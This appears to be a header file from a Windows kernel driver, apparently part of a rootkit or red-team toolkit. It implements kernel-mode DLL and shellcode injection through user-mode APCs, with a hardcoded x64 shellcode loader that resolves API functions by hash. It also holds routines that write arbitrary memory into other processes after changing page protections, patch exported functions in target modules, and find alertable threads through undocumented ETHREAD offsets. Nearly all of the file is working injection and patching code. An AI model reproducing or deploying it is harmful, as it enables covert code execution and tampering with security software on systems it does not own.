#pragma once
#include "pch.h"

// Prototypes.
PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName);
PVOID GetFunctionAddress(PVOID moduleBase, CHAR* functionName);
NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode);
NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode);
NTSTATUS PatchModule(PatchedModule* ModuleInformation);
NTSTATUS InjectShellcode(ShellcodeInformation* ShellcodeInformation);
NTSTATUS InjectDll(DllInformation* DllInfo);
NTSTATUS FindThread(HANDLE pid, PETHREAD* Thread);
VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);
VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);

// Definitions.
#define PATH_OFFSET 0x190
#define DLL_INJ_SHELLCODE_SIZE 704
#define ALERTABLE_THREAD_FLAG_BIT 0x10
#define ALERTABLE_THREAD_FLAG_OFFSET 0x74
#define GUI_THREAD_FLAG_BIT 0x80
#define GUI_THREAD_FLAG_OFFSET 0x78
#define THREAD_KERNEL_STACK_OFFSET 0x58
#define THREAD_CONTEXT_STACK_POINTER_OFFSET 0x2C8

UCHAR shellcodeTemplate[DLL_INJ_SHELLCODE_SIZE] = {
	0x56, 0x48, 0x89, 0xE6, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20,
	0xE8, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF4, 0x5E, 0xC3, 0x66, 0x2E,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x53, 0xB9, 0xF0, 0x1D,
	0xD3, 0xAD, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x91, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x33, 0x48, 0x89, 0xC1, 0xBA, 0xDB, 0x2F, 0x07, 0xB7,
	0xE8, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC3, 0xE8, 0x67, 0x02, 0x00,
	0x00, 0x48, 0x8D, 0x0D, 0x40, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x59,
	0x02, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x48, 0x29, 0xD1, 0x48, 0x01,
	0xC1, 0x48, 0x89, 0xD8, 0x5B, 0xFF, 0xE0, 0x48, 0x83, 0xC4, 0x20, 0x5B,
	0xC3, 0x90, 0x90, 0x90, 0x49, 0x89, 0xD1, 0x49, 0x89, 0xC8, 0xBA, 0x05,
	0x15, 0x00, 0x00, 0x8A, 0x01, 0x4D, 0x85, 0xC9, 0x75, 0x06, 0x84, 0xC0,
	0x75, 0x16, 0xEB, 0x2F, 0x41, 0x89, 0xCA, 0x45, 0x29, 0xC2, 0x4D, 0x39,
	0xCA, 0x73, 0x24, 0x84, 0xC0, 0x75, 0x05, 0x48, 0xFF, 0xC1, 0xEB, 0x07,
	0x3C, 0x60, 0x76, 0x03, 0x83, 0xE8, 0x20, 0x41, 0x89, 0xD2, 0x0F, 0xB6,
	0xC0, 0x48, 0xFF, 0xC1, 0x41, 0xC1, 0xE2, 0x05, 0x44, 0x01, 0xD0, 0x01,
	0xC2, 0xEB, 0xC4, 0x89, 0xD0, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x57, 0x56, 0x48, 0x89, 0xCE, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48,
	0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48,
	0x8B, 0x78, 0x20, 0x48, 0x89, 0xFB, 0x0F, 0xB7, 0x53, 0x48, 0x48, 0x8B,
	0x4B, 0x50, 0xE8, 0x85, 0xFF, 0xFF, 0xFF, 0x89, 0xC0, 0x48, 0x39, 0xF0,
	0x75, 0x06, 0x48, 0x8B, 0x43, 0x20, 0xEB, 0x11, 0x48, 0x8B, 0x1B, 0x48,
	0x85, 0xDB, 0x74, 0x05, 0x48, 0x39, 0xDF, 0x75, 0xD9, 0x48, 0x83, 0xC8,
	0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5E, 0x5F, 0xC3, 0x41, 0x57, 0x41,
	0x56, 0x49, 0x89, 0xD6, 0x41, 0x55, 0x41, 0x54, 0x55, 0x31, 0xED, 0x57,
	0x56, 0x53, 0x48, 0x89, 0xCB, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x63, 0x41,
	0x3C, 0x8B, 0xBC, 0x08, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xCF, 0x44,
	0x8B, 0x7F, 0x20, 0x44, 0x8B, 0x67, 0x1C, 0x44, 0x8B, 0x6F, 0x24, 0x49,
	0x01, 0xCF, 0x39, 0x6F, 0x18, 0x76, 0x31, 0x89, 0xEE, 0x31, 0xD2, 0x41,
	0x8B, 0x0C, 0xB7, 0x48, 0x01, 0xD9, 0xE8, 0x15, 0xFF, 0xFF, 0xFF, 0x4C,
	0x39, 0xF0, 0x75, 0x18, 0x48, 0x01, 0xF6, 0x48, 0x01, 0xDE, 0x42, 0x0F,
	0xB7, 0x04, 0x2E, 0x48, 0x8D, 0x04, 0x83, 0x42, 0x8B, 0x04, 0x20, 0x48,
	0x01, 0xD8, 0xEB, 0x04, 0xFF, 0xC5, 0xEB, 0xCA, 0x48, 0x83, 0xC4, 0x28,
	0x5B, 0x5E, 0x5F, 0x5D, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F,
	0xC3, 0x90, 0x90, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xB0, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x58, 0x48, 0x83,
	0xE8, 0x05, 0xC3, 0x0F, 0x1F, 0x44, 0x00, 0x00
};

/*
* Description:
* InjectDll is responsible injecting a dll in a certain usermode process.
*
* Parameters:
* @DllInfo [DllInformation*] -- All the information regarding the injected dll.
*
* Returns:
* @status  [NTSTATUS]		 -- Whether successfuly injected or not.
*/
NTSTATUS InjectDll(DllInformation* DllInfo) {
	SIZE_T bytesWritten;
	ShellcodeInformation ShellcodeInfo;
	PVOID shellcode;
	SIZE_T shellcodeSize = DLL_INJ_SHELLCODE_SIZE;

	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &shellcode, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status))
		return status;
	shellcodeSize = DLL_INJ_SHELLCODE_SIZE;

	// Filling the shellcode from the template.
	status = KeWriteProcessMemory(&shellcodeTemplate, PsGetCurrentProcess(), shellcode, shellcodeSize, KernelMode);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	status = KeWriteProcessMemory(&(DllInfo->DllPath), PsGetCurrentProcess(), (PUCHAR)shellcode + PATH_OFFSET, sizeof(DllInfo->DllPath), KernelMode);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Creating the shellcode information for APC injection.
	ShellcodeInfo.Parameter1 = NULL;
	ShellcodeInfo.Parameter2 = NULL;
	ShellcodeInfo.Parameter3 = NULL;
	ShellcodeInfo.Pid = DllInfo->Pid;
	ShellcodeInfo.Shellcode = shellcode;
	ShellcodeInfo.ShellcodeSize = DLL_INJ_SHELLCODE_SIZE;

	status = InjectShellcode(&ShellcodeInfo);

CleanUp:
	if (!NT_SUCCESS(status) && shellcode)
		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);

	return status;
}

/*
* Description:
* InjectShellcode is responsible injecting a shellcode in a certain usermode process.
*
* Parameters:
* @ShellcodeInfo [ShellcodeInformation*] -- All the information regarding the injected shellcode.
*
* Returns:
* @status		 [NTSTATUS]				 -- Whether successfuly injected or not.
*/
NTSTATUS InjectShellcode(ShellcodeInformation* ShellcodeInfo) {
	OBJECT_ATTRIBUTES objAttr;
	CLIENT_ID cid;
	HANDLE hProcess = NULL;
	PEPROCESS TargetProcess = NULL;
	PETHREAD TargetThread = NULL;
	PKAPC ShellcodeApc = NULL;
	PKAPC PrepareApc = NULL;
	PVOID shellcodeAddress = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;

	HANDLE pid = UlongToHandle(ShellcodeInfo->Pid);
	status = PsLookupProcessByProcessId(pid, &TargetProcess);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Find APC suitable thread.
	status = FindThread(pid, &TargetThread);

	if (!NT_SUCCESS(status) || !TargetThread) {
		if (NT_SUCCESS(status))
			status = STATUS_NOT_FOUND;
		goto CleanUp;
	}

	// Allocate and write the shellcode.
	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	cid.UniqueProcess = pid;
	cid.UniqueThread = NULL;

	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Create and execute the APCs.
	ShellcodeApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
	PrepareApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);

	if (!ShellcodeApc || !PrepareApc) {
		status = STATUS_UNSUCCESSFUL;
		goto CleanUp;
	}
	
	dimGlobals.KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
	dimGlobals.KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);

	if (!dimGlobals.KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
		status = STATUS_UNSUCCESSFUL;
		goto CleanUp;
	}

	if (!dimGlobals.KeInsertQueueApc(PrepareApc, NULL, NULL, FALSE)) {
		status = STATUS_UNSUCCESSFUL;
		goto CleanUp;
	}

	if (PsIsThreadTerminating(TargetThread))
		status = STATUS_THREAD_IS_TERMINATING;

CleanUp:
	if (!NT_SUCCESS(status)) {
		if (shellcodeAddress)
			ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
		if (PrepareApc)
			ExFreePoolWithTag(PrepareApc, DRIVER_TAG);
		if (ShellcodeApc)
			ExFreePoolWithTag(ShellcodeApc, DRIVER_TAG);
	}

	if (TargetProcess)
		ObDereferenceObject(TargetProcess);

	if (hProcess)
		ZwClose(hProcess);

	return status;
}

/*
* Description:
* PatchModule is responsible for patching a certain moudle in a certain process.
*
* Parameters:
* @ModuleInformation [PatchedModule*] -- All the information regarding the module that needs to be patched.
*
* Returns:
* @status			 [NTSTATUS]		  -- Whether successfuly patched or not.
*/
NTSTATUS PatchModule(PatchedModule* ModuleInformation) {
	PEPROCESS TargetProcess;
	KAPC_STATE state;

	PVOID functionAddress = NULL;
	PVOID moduleImageBase = NULL;
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	// Copying the values to local variables before they are unaccesible because of KeStackAttachProcess.
	WCHAR* moduleName = (WCHAR*)ExAllocatePool(PagedPool, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));

	if (!moduleName)
		return status;
	memcpy(moduleName, ModuleInformation->ModuleName, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));

	CHAR* functionName = (CHAR*)ExAllocatePool(PagedPool, strlen(ModuleInformation->FunctionName) + 1);

	if (!functionName) {
		ExFreePool(moduleName);
		return status;
	}
	memcpy(functionName, ModuleInformation->FunctionName, strlen(ModuleInformation->FunctionName) + 1);

	if (PsLookupProcessByProcessId((HANDLE)ModuleInformation->Pid, &TargetProcess) != STATUS_SUCCESS) {
		ExFreePool(functionName);
		ExFreePool(moduleName);
		return status;
	}

	// Getting the PEB.
	KeStackAttachProcess(TargetProcess, &state);
	moduleImageBase = GetModuleBase(TargetProcess, moduleName);

	if (!moduleImageBase) {
		KdPrint((DRIVER_PREFIX "Failed to get image base.\n"));
		KeUnstackDetachProcess(&state);
		goto CleanUp;
	}

	functionAddress = GetFunctionAddress(moduleImageBase, functionName);

	if (!functionAddress) {
		KdPrint((DRIVER_PREFIX "Failed to get function's address.\n"));
		KeUnstackDetachProcess(&state);
		goto CleanUp;
	}
	KeUnstackDetachProcess(&state);

	status = KeWriteProcessMemory(ModuleInformation->Patch, TargetProcess, functionAddress, (SIZE_T)ModuleInformation->PatchLength, KernelMode);

	if (!NT_SUCCESS(status))
		KdPrint((DRIVER_PREFIX "Failed to patch function, (0x%08X).\n", status));

CleanUp:
	ExFreePool(moduleName);
	ExFreePool(functionName);
	ObDereferenceObject(TargetProcess);
	return status;
}

/*
* Description:
* KeWriteProcessMemory is responsible for writing data to any target process.
*
* Parameters:
* @sourceDataAddress [PVOID]	 -- The address of data to write.
* @TargetProcess	 [PEPROCESS] -- Target process to write.
* @targetAddress	 [PVOID]	 -- Target address to write.
* @dataSize			 [SIZE_T]	 -- Size of data to write.
* @mode			     [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
*
* Returns:
* @status			 [NTSTATUS]	 -- Whether successfuly written or not.
*/
NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
	HANDLE hTargetProcess;
	ULONG oldProtection;
	SIZE_T patchLen;
	SIZE_T bytesWritten;
	NTSTATUS status = STATUS_SUCCESS;

	if (mode != KernelMode && mode != UserMode) {
		KdPrint((DRIVER_PREFIX "Invalid mode.\n"));
		return STATUS_UNSUCCESSFUL;
	}

	// Making sure that the given kernel mode address is valid.
	if (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
		status = STATUS_UNSUCCESSFUL;
		KdPrint((DRIVER_PREFIX "Invalid kernel source address or target address.\n"));
		return status;
	}
	else if (mode == UserMode && (!VALID_USERMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
		status = STATUS_UNSUCCESSFUL;
		KdPrint((DRIVER_PREFIX "Invalid user mode source address or target address.\n"));
		return status;
	}

	// Adding write permissions.
	status = ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, mode, &hTargetProcess);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "Failed to get process to handle.\n"));
		return status;
	}

	patchLen = dataSize;
	PVOID addressToProtect = targetAddress;
	status = dimGlobals.ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, PAGE_READWRITE, &oldProtection);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "Failed to change protection, (0x%08X).\n", status));
		ZwClose(hTargetProcess);
		return status;
	}
	ZwClose(hTargetProcess);

	// Writing the data.
	status = dimGlobals.MmCopyVirtualMemory(PsGetCurrentProcess(), sourceDataAddress, TargetProcess, targetAddress, dataSize, KernelMode, &bytesWritten);

	if (!NT_SUCCESS(status))
		KdPrint((DRIVER_PREFIX "MmCopyVirtualMemory failed status, (0x%08X).\n", status));

	// Restoring permissions and cleaning up.
	if (ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, mode, &hTargetProcess) == STATUS_SUCCESS) {
		patchLen = dataSize;
		dimGlobals.ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, oldProtection, &oldProtection);
		ZwClose(hTargetProcess);
	}

	return status;
}

/*
* Description:
* KeReadProcessMemory is responsible for read data from any target process.
*
* Parameters:
* @Process		 [PEPROCESS] -- Process to read data from.
* @sourceAddress [PVOID]	 -- Address to read data from.
* @targetAddress [PVOID]     -- Address to read data to.
* @dataSize		 [SIZE_T]	 -- Size of data to read.
* @mode			 [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
*
* Returns:
* @status		 [NTSTATUS]	 -- Whether successfuly read or not.
*/
NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
	SIZE_T bytesRead;

	if (mode != KernelMode && mode != UserMode) {
		KdPrint((DRIVER_PREFIX "Invalid mode.\n"));
		return STATUS_UNSUCCESSFUL;
	}

	// Making sure that the given kernel mode address is valid.
	if (mode == KernelMode && !VALID_KERNELMODE_MEMORY((DWORD64)targetAddress)) {
		KdPrint((DRIVER_PREFIX "Invalid kernel target address.\n"));
		return STATUS_UNSUCCESSFUL;
	}
	else if (mode == UserMode && !VALID_USERMODE_MEMORY((DWORD64)targetAddress)) {
		KdPrint((DRIVER_PREFIX "Invalid user mode target address.\n"));
		return STATUS_UNSUCCESSFUL;
	}

	return dimGlobals.MmCopyVirtualMemory(Process, sourceAddress, PsGetCurrentProcess(), targetAddress, dataSize, KernelMode, &bytesRead);
}

/*
* Description:
* GetModuleBase is responsible for getting the base address of given module inside a given process.
*
* Parameters:
* @Process    [PEPROCESS] -- The process to search on.
* @moduleName [WCHAR*]	  -- Module's name to search.
*
* Returns:
* @moduleBase [PVOID]	  -- Base address of the module if found, else null.
*/
PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
	PVOID moduleBase = NULL;
	LARGE_INTEGER time = { 0 };
	time.QuadPart = -100ll * 10 * 1000;

	PREALPEB targetPeb = (PREALPEB)dimGlobals.PsGetProcessPeb(Process);

	if (!targetPeb) {
		KdPrint((DRIVER_PREFIX "Failed to get PEB.\n"));
		return moduleBase;
	}

	for (int i = 0; !targetPeb->LoaderData && i < 10; i++)
	{
		KeDelayExecutionThread(KernelMode, TRUE, &time);
	}

	if (!targetPeb->LoaderData) {
		KdPrint((DRIVER_PREFIX "Failed to get LDR.\n"));
		return moduleBase;
	}

	// Getting the module's image base.
	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
		pListEntry = pListEntry->Flink) {

		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (_wcsnicmp(pEntry->FullDllName.Buffer, moduleName, pEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
			moduleBase = pEntry->DllBase;
			break;
		}
	}

	return moduleBase;
}

/*
* Description:
* GetFunctionAddress is responsible for getting the function address inside given module from its EAT.
*
* Parameters:
* @moduleBase      [PVOID] -- Module's image base address.
* @functionName    [CHAR*] -- Function name to search.
*
* Returns:
* @functionAddress [PVOID] -- Function address if found, else null.
*/
PVOID GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
	PVOID functionAddress = NULL;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

	// Checking that the image is valid PE file.
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		KdPrint((DRIVER_PREFIX "DOS signature isn't valid.\n"));
		return functionAddress;
	}

	PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)moduleBase + dosHeader->e_lfanew);

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		KdPrint((DRIVER_PREFIX "NT signature isn't valid.\n"));
		return functionAddress;
	}

	IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

	if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
		KdPrint((DRIVER_PREFIX "There are no exports.\n"));
		return functionAddress;
	}

	// Iterating the export directory.
	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* addresses = (DWORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfFunctions);
	WORD* ordinals = (WORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfNameOrdinals);
	DWORD* names = (DWORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfNames);

	for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
		if (_stricmp((char*)((PUCHAR)moduleBase + names[j]), functionName) == 0) {
			functionAddress = (PUCHAR)moduleBase + addresses[ordinals[j]];
			break;
		}
	}

	return functionAddress;
}

/*
* Description:
* GetModuleBase is responsible for finding an alertable thread within a process.
*
* Parameters:
* @Process    [PEPROCESS] -- The process to search on.
*
* Returns:
* @Thread	  [PETHREAD]  -- PETHREAD object if found, else null.
*/
NTSTATUS FindThread(HANDLE pid, PETHREAD* Thread) {
	ULONG alertableThread;
	ULONG guiThread;
	PSYSTEM_PROCESS_INFO originalInfo = NULL;
	PSYSTEM_PROCESS_INFO info = NULL;
	ULONG infoSize = 0;
	NTSTATUS status = dimGlobals.ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (originalInfo) {
			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
			originalInfo = NULL;
		}

		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);

		if (!originalInfo)
			return STATUS_INSUFFICIENT_RESOURCES;

		status = dimGlobals.ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !originalInfo)
		goto CleanUp;
	status = STATUS_NOT_FOUND;

	// Using another info variable to avoid BSOD on freeing.
	info = originalInfo;

	// Iterating the processes information until our pid is found.
	while (info->NextEntryOffset) {
		if (info->UniqueProcessId == pid) {
			status = STATUS_SUCCESS;
			break;
		}
		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
	}

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Finding a suitable thread.
	for (ULONG i = 0; i < info->NumberOfThreads; i++) {
		if (info->Threads[i].ClientId.UniqueThread == PsGetCurrentThread())
			continue;

		status = PsLookupThreadByThreadId(info->Threads[i].ClientId.UniqueThread, Thread);

		if (!NT_SUCCESS(status) || PsIsThreadTerminating(*Thread)) {
			ObDereferenceObject(*Thread);
			*Thread = NULL;
			continue;
		}

		guiThread = *(PULONG64)((PUCHAR)*Thread + GUI_THREAD_FLAG_OFFSET) & GUI_THREAD_FLAG_BIT;
		alertableThread = *(PULONG64)((PUCHAR)*Thread + ALERTABLE_THREAD_FLAG_OFFSET) & ALERTABLE_THREAD_FLAG_BIT;

		if (guiThread != 0 ||
			alertableThread == 0 ||
			*(PULONG64)((PUCHAR)*Thread + THREAD_KERNEL_STACK_OFFSET) == 0 ||
			*(PULONG64)((PUCHAR)*Thread + THREAD_CONTEXT_STACK_POINTER_OFFSET) == 0) {
			ObDereferenceObject(*Thread);
			*Thread = NULL;
			continue;
		}
		break;
	}

	status = *Thread ? STATUS_SUCCESS : STATUS_NOT_FOUND;

CleanUp:
	if (originalInfo) {
		ExFreePoolWithTag(originalInfo, DRIVER_TAG);
		originalInfo = NULL;
	}

	return status;
}

/*
* Description:
* ApcInjectionCallback is responsible for handling the APC cleanup.
*
* Parameters:
* @Apc			   [PKAPC]			   -- The received APC.
* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
* @NormalContext   [PVOID*]			   -- The first parameter.
* @SystemArgument1 [PVOID*]			   -- The second parameter.
* @SystemArgument2 [PVOID*]			   -- The third parameter.
*
* Returns:
* There is no return value.
*/
VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	if (PsIsThreadTerminating(PsGetCurrentThread()))
		*NormalRoutine = NULL;

	ExFreePoolWithTag(Apc, DRIVER_TAG);
}

/*
* Description:
* PrepareApcCallback is responsible for force the APC execution.
*
* Parameters:
* @Apc			   [PKAPC]			   -- The received APC.
* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
* @NormalContext   [PVOID*]			   -- The first parameter.
* @SystemArgument1 [PVOID*]			   -- The second parameter.
* @SystemArgument2 [PVOID*]			   -- The third parameter.
*
* Returns:
* There is no return value.
*/
VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	dimGlobals.KeTestAlertThread(UserMode);
	ExFreePoolWithTag(Apc, DRIVER_TAG);
}